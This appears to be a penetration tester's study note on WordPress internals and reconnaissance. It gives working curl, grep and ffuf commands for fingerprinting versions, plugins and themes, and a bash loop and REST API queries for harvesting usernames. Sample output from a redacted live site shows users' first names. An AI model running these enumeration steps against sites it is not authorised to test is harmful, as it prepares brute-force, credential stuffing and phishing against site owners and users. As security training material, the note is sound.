---
created: 2026-03-21
tags:
  - cms
  - web_hacking
  - wordpress
---

## WordPress

>**[WordPress](https://wordpress.org/)** is an open-source web Content Management System (CMS) written in PHP and paired with a MySQL or MariaDB database.

- According to [`W3Techs`](https://w3techs.com/technologies/overview/content_management), WordPress powers **over 43% of all websites on the Internet** and holds around **60% of the CMS market share**.
- It supports **over 65,000** plugins and **tens of thousands** of themes.
- **WooCommerce**, built on top of WordPress, is the world's most popular e-commerce platform, with over 36% market share.
- **Divi**, the most popular WordPress theme, is used on over **3.8 million websites**.

From a security perspective, this means that a single critical vulnerability in a popular plugin can affect **hundreds of thousands of sites simultaneously**. 

>[!interesting]+ CMS
>**CMS (Content Management System)** is a software application used to create, manage, and publish digital content — particularly for websites — without requiring the operator to possess technical expertise in programming or web server administration.
> 
> - The main goal of a CMS is to offload backend infrastructure so that site owners can focus more on the content and design of their websites.
> - Most CMSs' provide a rich [What You See Is What You Get (WYSIWYG)](https://en.wikipedia.org/wiki/WYSIWYG) editor where users can edit content as if they were working in a word processing tool, such as Microsoft Word.
> - Users can upload media directly from a media library interface instead of interacting with the web server, either from a management portal or via FTP or SFTP.
> 

> [!bug]+ WordPress attack surface
> - **Plugins** — Third-party PHP extensions; the primary attack vector.
> - **Themes** — Visual frameworks, often include PHP code; vulnerabilities are usually client-side.
> - **WordPress Core** — Updated monthly, heavily scrutinized; however, lagged installations are common.
> - **REST API** — WordPress REST API endpoints.
> - **XML-RPC** — Legacy remote management protocol; uses HTTP as a transport.
> - **WP-Cron** — Scheduled task system.
> - **User authentication** — Login forms, session management.
> - **File upload mechanisms** — Media library, plugin/theme installation.
> - **Database layer** — SQL injection opportunities in custom queries.


	
## Components and architecture

>At its heart, WordPress is a classic web application built on the **LAMP** or **LEMP** stack: Linux, Apache/Nginx, MySQL/MariaDB, and PHP.

Core WordPress components:

- **The WordPress Core** (The Engine)
	- A collection of PHP files that power all website logic, including request handling, user authentication, database interaction, plugin/theme loading, plugin API (hooks and filters), and admin dashboards.
	- One of the most important mechanisms to understand is **the Loop** — an internal mechanism that retrieves content from the database and renders it using the active theme template.

- **The Database** (The Storage)
	- A relational database, usually MySQL or MariaDB, that stores all dynamic content loaded to WordPress: posts, pages, user credentials, comments, theme settings, plugin configuration, etc.
	- The PHP layer communicates with the database via the `wpdb` class — a custom wrapper around PHP's MySQL extensions. It implements a query caching layer and a `prepare()` method for parameterized queries (designed to prevent SQL injection).

- **The Web Server** (The Foundation)
	- An Apache or Nginx web server that handles request routing.
	- Apache uses per-directory `.htaccess` configuration files, and Nginx relies on server-block rules.

- **Themes** (The Appearance)
	- **A WordPress theme** is a collection of PHP template files, CSS stylesheets, JavaScript files, and optional media assets that controls the visual presentation and layout of a WordPress site.
	- Themes are located at `/wp-content/themes/<theme_name>/`.

- **Plugins** (The Features)
	- **A WordPress plugin** is a software component, typically written in PHP, that extends or modifies core WordPress functionality. Plugins *hook* into WordPress core using the plugin API via **actions** and **filters**.
	- Plugins live in `/wp-content/plugins/<plugin_name>`. 
	- There are over 59,000 free plugins on the official repository alone, plus thousands of premium ones.

>[!note] WordPress is not a standard MVC (Model-View-Controller) framework; it’s a **Hook-based architecture**.

>[!bug] Plugins are the WordPress' **primary attack vector**.

- **The Media Library** (The Assets)
	- Uploaded files (images, PDFs, videos, etc.) are stored under `/wp-content/uploads/`, organized by year and month (e.g., `uploads/2026/03/`).

- **WP-Cron** (The Scheduler)
	- **WP-Cron** is WordPress's built-in system for scheduling time-based task, implemented as a PHP script (`wp-cron.php`). It's triggered on every page load and used for tasks like checking for updates and publishing scheduled posts.
### Database schema

>[!important] WordPress uses MySQL v5.7+ or MariaDB v10.3+.

- **Key database tables:**

| Table                   | Description                                                                          |
| ----------------------- | ------------------------------------------------------------------------------------ |
| `wp_users`              | Stores usernames, hashed password, and email addresses.                              |
| `wp_usermeta`           | Key-value store for user metadata, including roles and capabilities.                 |
| `wp_options`            | Site-wide configuration, plugin and settings; often stores credentials and API keys. |
| `wp_posts`              | Posts, static pages, attachments, etc.                                               |
| `wp_postmeta`           | Post metadata.                                                                       |
| `wp_commends`           | Comments.                                                                            |
| `wp_commentmeta`        | Comment metadata.                                                                    |
| `wp_terms`              | Taxonomy term names (categories, tags, custom taxonomies).                           |
| `wp_term_relationships` | Associates posts with taxonomy terms (many-to-many relationship).                    |

### WordPress user roles

| Role            | Capabilities                                                  |
| --------------- | ------------------------------------------------------------- |
| `Administrator` | Full access: install plugins, edit PHP, manage users, etc.    |
| `Editor`        | Publish and manage all posts, including posts of other users. |
| `Author`        | Publish and manage own posts only.                            |
| `Contributor`   | Write posts, but not publish.                                 |
| `Subscriber`    | View content, edit own profile.                               |

>[!note] In **multi-site** WordPress installations, a **Super Admin** role sits above regular Administrators and controls the entire network.


### Default file structure

- By default, WordPress installs into the webroot at `/var/www/html`. 
- The root directory contains critical files like `wp-config.php` (database credentials and security keys), `.htaccess` (URL rewriting rules), and `index.php` (the entry point).

Here's the layout:

```bash
tree -L 1 /var/www/html
.
├── index.php
├── .htaccess
├── license.txt
├── readme.html
├── wp-admin/
├── wp-content/
├── wp-includes/
├── wp-activate.php
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-cron.php
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

- Key configuration and bootstrap files:

| Directory                 | Description                                                                                                                                                                     |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `index.php`               | Primary entry point for all front‑end requests; executed when users visit the site root.                                                                                        |
| `wp-blog-header.php`      | Included by `index.php`; loads WordPress environment.                                                                                                                           |
| `wp-load.php`             | Loads `wp-config.php` and initializes WordPress.                                                                                                                                |
| `wp-config.php`           | Main configuration file that contains database credentials (`DB_NAME`, `DB_USER`, `DB_PASSWORD`, `DB_HOST`), authentication salts/keys, table prefix, debug settings, and more. |
| `wp-settings.php`         | Initializes core functionality, defines constants, loads libraries, and establishes database connections.                                                                       |
| `.htaccess` (Apache-only) | Apache per-directory configuration file; controls URL rewriting (permalinks), caching rules, and security directives.                                                           |
| `license.txt`             | GNU GPL v2 license text.                                                                                                                                                        |
| `readme.html`             | Installation instructions, system requirements, resource links.                                                                                                                 |

- Standalone PHP files that handle specific specific functionality outside of normal request flow:

| File                   | Description                                                                               |
| ---------------------- | ----------------------------------------------------------------------------------------- |
| `wp-login.php`         | Displays the login form, processes authentication, and handles password recovery.         |
| `wp-cron.php`          | Executes scheduled tasks; triggered on page loads to check for pending jobs.              |
| `wp-comments-post.php` | Processes submitted comment forms.                                                        |
| `wp-activate.php`      | Confirms email activation keys for multisite user signups.                                |
| `wp-signup.php`        | Displays multisite network signup form.                                                   |
| `wp-trackback.php`     | Processes trackback notifications from external sites.                                    |
| `wp-mail.php`          | Handles “Post via Email” functionality.                                                   |
| `wp-links-opml.php`    | Generates XML link lists (legacy feature, maintained for backward compatibility).         |
| `xmlrpc.php`           | Processes XML‑RPC requests for remote publishing, mobile apps, and external integrations. |

- The `wp-config.php` file contains information required by WordPress to connect to the database (e.g., database name, host, username and password, authentication keys and salts, the database table prefix).

>[!example]+
> ```PHP
> <?php
> /* ... */
> 
> /** The name of the database for WordPress */
> define( 'DB_NAME', 'database_name_here' );
> 
> /** MySQL database username */
> define( 'DB_USER', 'username_here' );
> 
> /** MySQL database password */
> define( 'DB_PASSWORD', 'password_here' );
> 
> /** MySQL hostname */
> define( 'DB_HOST', 'localhost' );
> 
> /** Authentication Unique Keys and Salts */
> /* <SNIP> */
> define( 'AUTH_KEY',         'put your unique phrase here' );
> define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
> define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
> define( 'NONCE_KEY',        'put your unique phrase here' );
> define( 'AUTH_SALT',        'put your unique phrase here' );
> define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
> define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
> define( 'NONCE_SALT',       'put your unique phrase here' );
> 
> /** WordPress Database Table prefix */
> $table_prefix = 'wp_';
> 
> /** For developers: WordPress debugging mode. */
> /** <SNIP> */
> define( 'WP_DEBUG', false );
> 
> /** Absolute path to the WordPress directory. */
> if ( ! defined( 'ABSPATH' ) ) {
>     define( 'ABSPATH', __DIR__ . '/' );
> }
> 
> /** Sets up WordPress vars and included files. */
> require_once ABSPATH . 'wp-settings.php';
> ```
#### `wp-admin/` directory

- The `wp-admin` directory contains everything required for the WordPress dashboard and administrative interface:
	- PHP files for managing posts, pages, comments, users, plugins, themes, and settings.
	- Admin‑specific CSS and JavaScript.
	- AJAX handlers for asynchronous admin operations.
	- Media upload and management interfaces.
	- Subdirectories containing admin‑specific functions and classes.
	- Menu system definitions and navigation logic/

>[!note]+ Possible login page paths
> - `/wp-admin/login.php`
> - `/wp-admin/wp-login.php`
> - `/login.php`
> - `/wp-login.php`

>[!warning] Files can be renamed.

#### `wp-content/` directory

- The `wp-content` directory stores plugins, themes, and uploads.
- This is the customization layer, completely separated from the core.

| Directory    | Description                                                                                                                                                                            |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `themes/`    | Theme directories; each contains template files (`index.php`, `header.php`, `footer.php`, `single.php`, `page.php`, etc.), `style.css`, `functions.php`, theme images, and JavaScript. |
| `plugins/`   | Plugin directories; each contains plugin PHP files, assets, and dependencies.                                                                                                          |
| `uploads/`   | Media library files organized by year/month (`uploads/2026/03/`).                                                                                                                      |
| `languages/` | Translation files (`.mo`, `.po`) for internationalization.                                                                                                                             |
| `upgrade/`   | Temporary directory used during updates.                                                                                                                                               |

- Plugins may also create **custom directories** for cache, logs, or data storage.

>[!bug]+ The `/wp-content/uploads` directory might be misconfigured to allow directory listings — which exposes all uploaded files. More importantly, If the web server is misconfigured to **execute PHP in the uploads directory**, this creates **file upload and RCE vulnerabilities**.

#### `wp-includes/` directory

- The `wp-includes` directory contains files that implement the WordPress core functionality — basically everything except admin components and themes.

| Component                             | Description                                                                                                                                                                                                                                |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Core PHP files                        | Over 140 files that define WordPress functions, classes, and APIs.                                                                                                                                                                         |
| `class-wp*.php` files                 | Object-oriented representations of core components (e.g., `class-wp-user.php`, `class-wp-query.php`, `class-wp-db.php`) for HTTP requests, database abstraction (`class-wpdb.php`), taxonomy management, post types, user management, etc. |
| `functions.php`                       | Deprecated functions maintained for backward compatibility.                                                                                                                                                                                |
| `plugin.php`                          | Plugin API implementation (actions/filters/hooks).                                                                                                                                                                                         |
| `theme.php`                           | Theme API functions.                                                                                                                                                                                                                       |
| `post.php`, `comment.php`, `user.php` | Core entity management functions.                                                                                                                                                                                                          |
| `rest-api/`                           | All logic for the WordPress REST API — a massive attack surface with numerous endpoints and varying authentication requirements.                                                                                                           |

### Request flow

When a user hits a WordPress site, here is what happens:

1. **`index.php` — Front controller**
	- Every dynamic request enters WordPress through this file (unless a server‑level rewrite bypasses it); it serves as a **front controller** (all routing is centralized).
	- `index.php` loads `wp-blog-header.php` to being the WordPress bootstrap sequence.
2. **`wp-blog-header.php` — Bootstrap trigger**
	- Includes `wp-load.php` to load the WordPress environment.
	- Once the environment is ready, it calls `wp()` to:
		- Create and initialize the main `WP_Query` instance.
		- Parse the request (URL, query parameters, rewrite rules, etc.).
		- Prepares WordPress to determine which template should be used.
3. **`wp-load.php` — Environment loader**
	- Determines the correct path to the WordPress installation.
	- Loads `wp-config.php`, which contains all site‑specific configuration.
	- At this point, WordPress knows how to connect to the database and where core files live.
4. **`wp-config.php` — Configuration and boot continuation**
	- Defines database credentials, salts, table prefix, and other constants.
	- Defines `ABSPATH` (absolute path), the root path for the installation.
	- Loads `wp-settings.php`, which performs the full system initialization.
5. **`wp-settings.php` — WordPress Initialization**
	- Loads all core components from `wp-includes/` (pluggable functions, formatting, query system, REST API, etc.).
	- Initializes the hooks system so plugins and themes can register actions and filters.
	- Loads **must‑use plugins** (`mu-plugins/`), then all **active plugins** (alphabetically).
	- Loads the active theme: `functions.php`, theme-registered hooks, and theme support declarations.
	- Prepares the template loader, which will later select the correct theme file.
6. **Template selection**
	- After initialization, `WP_Query` determines what the request represents (post, page, archive, `404`, REST API route, etc.) and walks the template hierarchy to find the specific matching theme file (e.g., `single-{post_type}.php`, `page-{slug}.php`, `archive.php`, `index.php`).
7.  **Rendering** 
	- The theme renders the response using template files and the Loop.
	- Plugins and themes hook into execution (`do_action`, `apply_filters`) to modify behavior or output.
	- WordPress sends the final HTML response to the browser.

>[!bug]+ Why deactivated plugins aren't always safe
>- PHP files of a deactivated plugin **still exist on the web server and are directly accessible**.
>- If the plugin contains a vulnerable endpoint that doesn't require WordPress to be fully initialized (like a standalone PHP file), **it's still exploitable event after deactivation in the admin panel**. 
### The hook system

WordPress is not a standard MVC framework — it's built around a **hook-based event system**. Two types of hooks exist:

- **Actions** (`add_action`) 
	- **Run custom code at specific points** in the WordPress lifecycle.
	- They do not return data; they are used for side effects.
	- Examples: 
		- Run code after a post is saved.
		- Modify admin screens.
		- Trigger logic when a user logs in.
		- Enqueue scripts and styles.
- **Filters** (`add_filter`) 
	- Intercept, modify, and return data before WordPress uses.
	- They must return a value, because WordPress uses the modified result.
	- Examples:
	    - Alter post content before rendering.
	    - Modify query arguments before a database request.
	    - Change email text before sending.
	    - Adjust REST API responses.
## WordPress enumeration

### Core version detection

#### Meta generator tag

- Many WordPress sites expose their version in meta generator tag in the HTML `<head>` section:

```bash
curl -s https://example.com | grep -i 'generator'
```

>[!example]+
> ```html
> <meta name="generator" content="WordPress 6.4.2" />
> ```
> 

>[!interesting]- Meta generator tag
>- **Meta Generator Tag** is an HTML meta tag used to identify the software or framework that generated a web page's code.  
>- It is typically formatted as `<meta name="generator" content="software name">`, where the `content` attribute specifies the tool, such as WordPress or Django.
>- According to HTML5 standards, the `generator` tag should only be used for pages generated by software, not manually written HTML.
#### `readme.html

- WordPress ships `readme.html` in the webroot by default; it provides installation instructions, system requirements, and other information. It often exposes the core WordPress version directory:

```bash
curl -s https://example.com/readme.html | grep -i "version"
```
#### `wp-links-opml.php`

- `wp-links-opml.php` generates an **OPML (Outline Processor Markup Language)** XML document of the site's blogroll links — a legacy feature disabled by default. 
- But the `wp-links-opml.php` file is still by default for backward compatibility, and may expose WordPress core version:

```bash
curl -s https://example.com/wp-links-opml.php
```

>[!example]+
> ```php
> <opml version="1.0">
> <head>
> <title>Redacted</title>
> <dateCreated>Sun, 25 Mar 2026 10:50:22 GMT</dateCreated>
> <!--  generator="WordPress/6.4.8"  -->
> </head>
> <body> </body>
> </opml>
> ```
#### RSS feed

- WordPress automatically generates RSS feeds for posts, comments, categories, and authors. Version information leaks through the `<generator>` tag:

```bash
curl -s https://example.com/feed/ | grep -i "generator"
```

```
https://example.com/feed/
https://example.com/comments/feed/
```

#### Versioned asset URLs

- WordPress appends `?ver=` to CSS and JS links in `/wp-includes/` and `/wp-admin/`. These reveal the core version:

```bash
curl -s https://example.com | grep -oP "https?://[^\"' ]+/wp-(?:includes|admin)/[^\"'?]+\?ver=[^\"' ]+"
```

>[!example]+
> ```bash
>curl -s https://redacted.cpm | grep -oP "https?://[^\"' ]+/wp-(?:includes|admin)/[^\"'?]+\?ver=[^\"' ]+"
> ```
> 
> ```bash
> https://redacted.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1
> https://redacted.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1
> ```


>[!interesting]+ Regex breakdown
>- `grep`'s `-o` only prints the matching part, not the whole line, and `-P` uses Perl-compatible regex (PCRE; more powerful regex engine).
> ```bash
> https?://[^\"' ]+/wp-(?:includes|admin)/[^\"'?]+\?ver=[^\"' ]+
> ```
>- `https?://` -> matches `http://` and `https://` schemes; `s?` -> optional `s`.
>- `[^\"' ]+` -> matches any sequence of characters until a quote or space appears (captures the domain and path before `/wp...`).
>	- `[]` -> character set.
>	- `[^\"' ]` selects all characters, excludes `"`, `'`, and space.
>	- `[...]+` -> matches one or more of characters inside square brackets.
>- `/wp-(?:includes|admin)/` -> matches `/wp-includes/` and `/wp-admin/`.
>- `[^\"'?]+` -> matches any sequence of characters until a quote or question mark appears (captures the file path and filename, without query string).
>- `\?ver=[^\"' ]+"` -> matches `?ver=` query parameter (`?` escaped) and any sequence of characters until a quote or space appears (captures version values, including versions with tags).

#### wp-json

- `/wp-json` is the root endpoint for the WordPress REST API. 
- It dumps a JSON document that describes all available routes, site name, an description of the WordPress site — and may expose the core WordPress version.

```bash
curl -s https://example.com/wp-json/ | jq
```

#### HTTP response headers

- Some misconfigured servers expose the version directly in HTTP response headers:

```bash
curl -sI https://example.com
```

> [!example]+
> ```HTTP
> X-Generator: WordPress 6.4.2
> ```
> 

### Enumerating plugins and themes

#### Inspecting HTML source

The most reliable passive ways to enumerate installed themes and plugins is to inspect HTML source code searching for `/wp-content` URLs.

- Enumerate plugins with their version by fetching all `/wp-content/plugin` URLs:

```bash
curl -s https://example.com | grep -oP 'wp-content/plugins/[^/]+/[^?]+\?ver=[0-9.]+' | sort -u
```

>[!interesting]- Regex breakdown 
>- `grep`'s `-o` only prints the matching part, not the whole line, and `-P` uses Perl-compatible regex (PCRE; more powerful regex engine).
>```
>wp-content/plugins/[^/]+/[^?]+\?ver=[0-9.]+
>```
>- `[^/]+` -> matches one path segment (`[^/]` matches any character except `/`, and `+` matches one or more of those).
>- `/` -> a literal slash; path separator.
>- `[^?]+` -> matches filename, such as `index.php` or `plugin-name` (`[^?]` matches any character except `?`, and `+` matches one or more of those).
>- `\?` -> a literal `?` (escaped, because `?` is normally a special regex symbol).
>- `ver=` -> literal text; a query parameter name.
>- `[0-9.]+` -> matches one or more digits or dots; version number. 
>- So, `wp-content/plugins/[^/]+/[^?]+\?ver=[0-9.]+` marches `wp-content/plugins/plugin-name?ver=1.2.3`.

- Enumerate themes and their versions by fetching all `/wp-content/themes` URLs:

```bash
curl -s https://example.com | grep -oP 'wp-content/themes/[^/]+/[^?]+\?ver=[0-9.]+' | sort -u
```

>[!warning]+ Versioned URLs is not reliable way to determine the exact plugin/theme versions. 
>- It can reveal what plugins and themes are installed, but there are better ways to get the versions.

>[!example]-
> ```bash
> curl -s https://redacted.com | grep -oP 'wp-content/plugins/[^/]+/[^?]+\?ver=[0-9.]+' | sort -u
> ```
> 
> ```bash
> wp-content/plugins/cf7-conditional-fields/js/scripts.js?ver=2.5.3
> wp-content/plugins/cf7-conditional-fields/style.css?ver=2.5.3
> wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.7.6
> wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.7.6
> wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.7.6
> wp-content/plugins/pojo-accessibility/assets/css/style.min.css?ver=1.0.0
> wp-content/plugins/pojo-accessibility/assets/js/app.min.js?ver=1.0.0
> ```
> - Enumeration reveals three plugins:
> 	- `cf7-conditional-fields`, version `2.5.3`
> 	- `contact-form-7`, version `5.7.6`
> 	- `pojo-accessibility`, version `1.0.0`


>[!example]-
> 
> ```bash
> curl -s https://redacted.com | grep -oP 'wp-content/themes/[^/]+/[^?]+\?ver=[0-9.]+' | sort -u
> ```
> 
> ```bash
> wp-content/themes/divi-child/css/aos.css?ver=6.4.8
> wp-content/themes/divi-child/css/custom-pages-style.css?ver=6.4.8
> wp-content/themes/divi-child/css/main.css?ver=4.98
> wp-content/themes/divi-child/css/select2.min.css?ver=6.4.8
> wp-content/themes/divi-child/css/simple-lightbox.min.css?ver=6.4.8
> wp-content/themes/divi-child/css/slick.css?ver=6.4.8
> wp-content/themes/divi-child/css/slick-theme.css?ver=6.4.8
> wp-content/themes/divi-child/css/video_recommendations.css?ver=6.4.8
> wp-content/themes/divi-child/js/aos-init-home.js?ver=1
> wp-content/themes/divi-child/js/aos.js?ver=1
> wp-content/themes/divi-child/js/main.js?ver=4.3
> wp-content/themes/divi-child/js/select2.min.js?ver=1
> wp-content/themes/divi-child/js/simple-lightbox.jquery.min.js?ver=1
> wp-content/themes/divi-child/js/slick.min.js?ver=1
> wp-content/themes/divi-child/style.css?ver=4.21.0
> wp-content/themes/Divi/core/admin/js/common.js?ver=4.21.0
> wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/easypiechart.js?ver=4.21.0
> wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/jquery.fitvids.js?ver=4.21.0
> wp-content/themes/Divi/js/scripts.min.js?ver=4.21.0
> ```

>[!tip]+ How to tell apart plugin/theme versions and WordPress core versions in links
>- Look at the path:
>
>|Path|Type|
|---|---|
|`/wp-content/plugins/...`|plugin|
|`/wp-content/themes/...`|theme|
|`/wp-includes/...`|WordPress core|
|`/wp-admin/...`|WordPress core|
>But you still can see WordPress core version in `/wp-content/plugins` or `/themes` links. This is because **WordPress uses its own version as a default `?ver=` value** if a script/stylesheet doesn't define its own version.

### Directory listings

- If misconfigured, you may find directory listings in the `/wp-content/plugins` and `/wp-content/themes` — this gives you all installed plugins and themes in one shot:

```
https://example.com/wp-content/plugins/
https://example.com/wp-content/themes/
```

![[wp-directory-listing.png]]

### REST API endpoints

- The WordPress REST API exposes installed plugins and themes to authenticated users (and sometimes unauthenticated):

```bash
curl -s https://example.com/wp-json/wp/v2/plugins | jq
```

```bash
curl -s https://example.com/wp-json/wp/v2/themes | jq
```

#### Fuzzing

When passive enumeration misses things, fall back to wordlist fuzzing:

- Fuzz for installed plugins:

```bash
ffuf -u https://example.com/wp-content/plugins/FUZZ/ \
     -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt \
     -mc 200,403 -c -t 50
```

- Fuzz for installed themes:

```bash
ffuf -u https://example.com/wp-content/themes/FUZZ/ \
     -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt \
     -mc 200,403 -c -t 50
```

> [!note] Why `-mc 200,403`? 
> A `403 Forbidden` response means the directory exists but has listing disabled — the plugin/theme is still there, you just can't browse the directory. Without including `403`, you'd miss installed plugins on servers with properly configured directory listing restrictions. 


> [!note] See `SecLists`'s CMS wordlists (`Discovery/Web-Content/CMS`):
> - [`SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt)
> - [`SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt)
> - [`SecLists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-themes.fuzz.txt)
#### Indirect methods

- **RSS feeds**
	- RSS feeds don't directly list installed plugins and themes, but often include theme- and plugin-generated content that may serve as indirect reference (e.g., Yoast SEO adds `<meta>` tags and RSS footer text).

```
https://example.com/feed/
```

- **HTTP headers**
	- HTTP headers may indirectly reveal installed plugins that add their own headers.

```
X-Powered-By: WP Rocket/3.14
X-LiteSpeed-Cache: hit
X-Redirect-By: WordPress
```

### Plugin and theme versions

>[!tip] Once you've identified plugins and their versions, look them up on the WPScan's vulnerability database: [`wpscan.com/plugins`](https://wpscan.com/plugins/).

- Many plugins expose `readme.txt` which tells the exact version of the plugin.

```bash
curl -s https://example.com/wp-content/plugins/<plugin-name>/readme.txt
```

>[!example]+
> ```bash
> curl -s https://redacted.com/wp-content/plugins/contact-form-7/readme.txt  
> ```
> 
> ``` 
> === Contact Form 7 ===
> Contributors: takayukister
> Donate link: https://contactform7.com/donate/
> Tags: contact, form, contact form, feedback, email, ajax, captcha, akismet, multilingual
> Requires at least: 6.0
> Tested up to: 6.2
> Stable tag: 5.7.6
> License: GPLv2 or later
> License URI: https://www.gnu.org/licenses/gpl-2.0.html
> # ...
> ```

- Every theme has a header with metadata in its `style.css` which includes the theme version:

```bash
curl -s https://example.com/wp-content/themes/<theme-name>/style.css
```

> [!example]+
> ```bash
> curl -s https://redacted.com/wp-content/themes/divi-child/style.css
> ```
> 
> ```bash
> /*
>  Theme Name:     Divi Child
>  Theme URI:      https://www.elegantthemes.com/gallery/divi/
>  Description:    Divi Child Theme
>  Author:         Elegant Themes
>  Author URI:     https://www.elegantthemes.com
>  Template:       Divi
>  Version:        1.0.0
> */
> /* ... */
> ```
> 

### User enumeration

A confirmed list of usernames is powerful: you can use it for targeted brute-force, credential stuffing, phishing, and it help you identify admin accounts worth prioritizing.

Ways to enumerate WordPress users:
- Author archive enumeration
- REST API enumeration
- RSS feed enumeration
- Login page error message enumeration
- XML-RPC enumeration
- Sitemap enumeration
- Theme and plugin metadata leaks

### Author archive enumeration

- WordPress assigns a numeric ID to every user and creates an author archive page accessible at `/?author=<ID>`:

```bash
https://example.com/?author=1
https://example.com/?author=2
```

- When the ID is valid, WordPress responds with `301 Moved Permanently` and redirect to the author's archive URL — which contains the username in the path `https://example.com/author/<username>/`.
- When the ID doesn't exist, WordPress responds with `404 Not Found`.

```bash
curl -s -I https://example.com/?author=1
```

- Loop through IDs `1`-`20` and extract usernames:

```bash
for i in $(seq 1 20); do
    response=$(curl -sI "https://example.com/?author=$i")
    username=$(echo "$response" | grep -i "location" | grep -oP 'author/\K[^/]+')
    if [ -n "$username" ]; then
        echo "[+] ID $i: $username"
    fi
done
```

>[!example]-
>- Existing users:
> ```bash
> curl -I -s 'https://redacted.com/?author=1' 
> ```
> ```HTTP
> HTTP/1.1 301 Moved Permanently
> Server: nginx
> Date: Sun, 22 Mar 2026 15:46:24 GMT
> Content-Type: text/html; charset=UTF-8
> Connection: keep-alive
> Vary: Accept-Encoding,Cookie
> Expires: Sun, 22 Mar 2026 16:46:24 GMT
> Cache-Control: max-age=3600
> X-Redirect-By: WordPress
> Location: https://redacted.com/author/admin/
> Front-End-Https: on
> ```
> 
> 
> ```bash
> curl -I -s 'https://redacted.com/?author=2' 
> ```
> ```HTTP
> HTTP/1.1 301 Moved Permanently
> Server: nginx
> Date: Sun, 22 Mar 2026 15:47:55 GMT
> Content-Type: text/html; charset=UTF-8
> Connection: keep-alive
> Vary: Accept-Encoding,Cookie
> Expires: Sun, 22 Mar 2026 16:47:55 GMT
> Cache-Control: max-age=3600
> X-Redirect-By: WordPress
> Location: https://redacted.com/author/agnieszka/
> Front-End-Https: on
> ```
> 
> 
> - Non-existing user:
> 
> ```bash
> curl -s -I 'https://redacted.com/?author=11' 
> ```
> ```http
> HTTP/1.1 404 Not Found
> Server: nginx
> Date: Sun, 22 Mar 2026 15:53:24 GMT
> Content-Type: text/html; charset=UTF-8
> Connection: keep-alive
> Vary: Accept-Encoding,Cookie
> Expires: Wed, 11 Jan 1984 05:00:00 GMT
> Cache-Control: no-cache, must-revalidate, max-age=0
> Link: <https://redacted.com/wp-json/>; rel="https://api.w.org/"
> ```

>[!example]-
> ```bash
> for i in $(seq 1 20); do
>     response=$(curl -sI "https://redacted.com/?author=$i")
>     username=$(echo "$response" | grep -i "location" | grep -oP 'author/\K[^/]+')
>     if [ -n "$username" ]; then
>         echo "[+] ID $i: $username"
>     fi
> done
> ```
> 
> ```bash
> [+] ID 1: admin
> [+] ID 2: agnieszka
> [+] ID 3: bartek
> [+] ID 5: kacper
> [+] ID 8: kamil
> [+] ID 15: alona
> [+] ID 18: ola
> [+] ID 20: iryna
> ```

### REST API username enumeration

- The WordPress REST API exposes a `/wp-json/wp/v2/users` endpoint that returns user details — without authentication by default:

```bash
curl -s https://example.com/wp-json/wp/v2/users | jq
```

>[!example]-
> ```bash
> curl -s https://redacted.com/wp-json/wp/v2/users | jq | head -n 100 
> ```
> 
> ```bash
> [
>   {
>     "id": 1,
>     "name": "admin",
>     "url": "https://redacted.com",
>     "description": "",
>     "link": "https://redacted.com/author/admin/",
>     "slug": "admin",
>     "avatar_urls": { ... },
>     ...
>   },
>   {
>     "id": 54,
>     "name": "adrianb",
>     "url": "",
>     "description": "",
>     "link": "https://redacted.com/author/adrianb/",
>     "slug": "adrianb",
>     "avatar_urls": { ... },
>     ...
>   },
>   {
>     "id": 2,
>     "name": "Agnieszka",
>     "url": "",
>     "description": "",
>     "link": "https://redacted.com/author/agnieszka/",
>     "slug": "agnieszka",
>     "avatar_urls": { ... },
>     ...
>   },
>   {
>     "id": 15,
>     "name": "alona",
>     "url": "",
>     "description": "",
>     "link": "https://redacted.com/author/alona/",
>     "slug": "alona",
>     "avatar_urls": { ... },
>     ...
>   },
>   ...
> ]
> ```

>[!note] `name` vs `slug` 
>- The `name` field is the display name (e.g., `John Doe`). 
>- The `slug` is the actual login username used for authentication (e.g., `jdoe`). 
### RSS feed enumeration

- WordPress often embeds author information in RSS feeds via `<dc:creator>` tags:

```bash
curl -s https://example.com/feed/ | grep -i "creator\|author"
```

```bash
https://example.com/feed/
https://example.com/comments/feed/
```

### Login page error message enumeration


WordPress's default login error messages differ based on whether the username exists:

| Error message                                                       | Scenario                                    |
| ------------------------------------------------------------------- | ------------------------------------------- |
| `Invalid username.`                                                 | The username does not exist in `wp_users`.  |
| `The password you entered for the username **admin** is incorrect.` | The username exists, the password is wrong. |
| `Error: The email address isn't registered.`                        | Email-based login, address not found.       |

- This is a textbook username enumeration vector. It is slow and noisy — automated tools like WPScan handle this much better. But it's good to understand the underlying behavior.

## XML-RPC attacks

>**XML-RPC** (Extensible Markup Language Remote Procedure Call) is a remote procedure call protocol that encodes method calls in **XML** and uses **HTTP** as its transport mechanism.

